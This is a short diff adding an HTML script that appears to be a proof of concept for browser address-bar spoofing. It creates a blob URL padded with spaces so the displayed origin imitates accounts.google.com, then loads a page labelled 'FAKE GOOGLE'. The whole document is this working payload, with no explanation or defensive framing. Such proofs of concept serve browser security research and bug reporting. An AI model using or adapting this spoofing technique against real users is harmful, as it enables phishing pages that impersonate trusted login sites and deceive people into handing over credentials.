@@ -1,0 +1,4 @@
+<script>
+var exp = 'FAKE GOOGLE<script>history.replaceState("","","blob:'+location.protocol+'//accounts.google.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';
+location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
+</script>
